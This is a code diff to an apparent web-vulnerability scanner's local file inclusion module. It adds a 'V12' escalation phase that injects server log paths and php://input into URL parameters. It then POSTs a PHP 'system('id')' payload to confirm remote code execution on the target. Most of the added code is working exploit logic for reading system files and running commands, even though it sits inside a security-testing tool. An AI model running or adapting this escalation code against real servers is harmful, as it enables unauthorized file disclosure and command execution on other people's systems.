@@ -35,6 +35,15 @@ class LfiAssaultScanner:
         # Filter matrix for LFI rules
         self.lfi_rules = [r for r in self.matrix if "lfi" in r.get("tags", []) or "path_traversal" in r.get("tags", [])]
 
+        # V12: Add Log Poisoning and Wrapper payloads to the mix
+        self.rce_bridge_payloads = [
+            "/var/log/apache2/access.log",
+            "/var/log/nginx/access.log",
+            "/var/log/httpd/access_log",
+            "/var/log/auth.log",
+            "php://input"
+        ]
+
     def scan(self, target, scan_id, urls=None, logger=None, finding_callback=None, quick=False):
         """
         Main entry point for LFI scanning.
@@ -57,8 +66,6 @@ class LfiAssaultScanner:
                 if logger: logger(f"LFI Assault: (Exhaustive) Processing all {len(urls)} target URLs", "INFO")
             
             urls_to_test.extend(urls)
-            
-        # 2. Attack Execution
             
         # 2. Attack Execution
         findings = []
@@ -130,6 +137,7 @@ class LfiAssaultScanner:
                      baselines[target_url] = b_resp.text if b_resp.status_code == 200 else ""
                  except: baselines[target_url] = ""
 
+        # Phase 1: Matrix Rules
         for rule in self.lfi_rules:
             # In quick mode, only test first 3 payloads per rule
             payloads_to_test = rule.get("payloads", [])
@@ -153,33 +161,68 @@ class LfiAssaultScanner:
                             
                             # CRITICAL: Verify success AND check that it's NOT in the baseline
                             if self._check_success(resp, rule, baseline_text=baseline_text):
-                                f = {
-                                    "title": f"Local File Inclusion (LFI) - {rule['rule_id']}",
-                                    "severity": "critical",
-                                    "confidence": "high",
-                                    "description": f"Confirmed Local File Inclusion via differential analysis.\nURL: {final_url}\nPayload: {payload}\nConfirmed using rule: {rule['rule_id']}",
-                                    "remediation": "Validate all user-supplied input against an allow-list of files. Avoid passing parameters directly to file system APIs. If possible, use an indirect reference map (e.g., ID 1 maps to file A).",
-                                    "risk_scorecard": {
-                                        "impact": "Critical",
-                                        "complexity": "Low",
-                                        "likelihood": "Medium"
-                                    },
-                                    "repro_command": f"curl -i '{final_url}'",
-                                    "request": f"GET {final_url} HTTP/1.1\nHost: {urlparse(target_url).netloc}",
-                                    "response": f"HTTP/1.1 {resp.status_code}\n\n{resp.text[:800]}",
-                                    "payload": payload,
-                                    "metadata": {
-                                        "validation_status": "confirmed_active",
+                                from scan_engine.helpers.finding_normalizer import FindingNormalizer
+                                findings.append(FindingNormalizer.from_response(
+                                    resp,
+                                    title=f"Local File Inclusion (LFI) - {rule['rule_id']}",
+                                    severity="critical",
+                                    confidence="high",
+                                    description=f"Confirmed Local File Inclusion via differential analysis.\nURL: {final_url}\nPayload: {payload}\nConfirmed using rule: {rule['rule_id']}",
+                                    tool_source="lfi_assault",
+                                    category="lfi",
+                                    payload=payload,
+                                    method="GET",
+                                    metadata={
                                         "rule_id": rule['rule_id'],
                                         "bypass_technique": "mutation_matrix"
                                     }
-                                }
-                                findings.append(f)
+                                ))
                                 break 
                         except Exception:
                             pass
                     if findings: break
                 if findings: break
+
+        # Phase 2: RCE Bridge Escalation (V12 Ultimate - Log Poisoning & php://input)
+        if findings or not quick:
+            for target_url, param in target_urls_with_points[:5]:
+                for bridge_payload in self.rce_bridge_payloads:
+                    final_url = self._inject(target_url, param, bridge_payload)
+                    try:
+                        resp = session.get(final_url, timeout=3, verify=False)
+                        
+                        # 1. Check if we can read logs or trigger wrapper
+                        is_log = "log" in bridge_payload
+                        is_php_input = "php://input" in bridge_payload
+                        
+                        success = False
+                        escalation_type = None
+                        
+                        if is_log and ("root:x:0:0:" in resp.text or "[extensions]" in resp.text or "apache" in resp.text.lower()):
+                            success = True
+                            escalation_type = "Log Poisoning Candidate"
+                        
+                        if is_php_input:
+                            # Attempt RCE verification via POST
+                            r_rce = session.post(final_url, data="<?php system('id'); ?>", timeout=5, verify=False)
+                            if "uid=" in r_rce.text:
+                                success = True
+                                escalation_type = "RCE via php://input"
+                        
+                        if success:
+                            from scan_engine.helpers.finding_normalizer import FindingNormalizer
+                            findings.append(FindingNormalizer.from_response(
+                                r_rce if is_php_input else resp,
+                                title=f"LFI Escalation: {escalation_type}",
+                                severity="critical",
+                                confidence="certain",
+                                description=f"Successfully escalated LFI to {escalation_type}.\nURL: {final_url}\nPayload: {bridge_payload}",
+                                tool_source="lfi_assault_rce",
+                                category="rce",
+                                payload=bridge_payload,
+                                method="POST" if is_php_input else "GET"
+                            ))
+                    except: pass
                             
         return findings
 
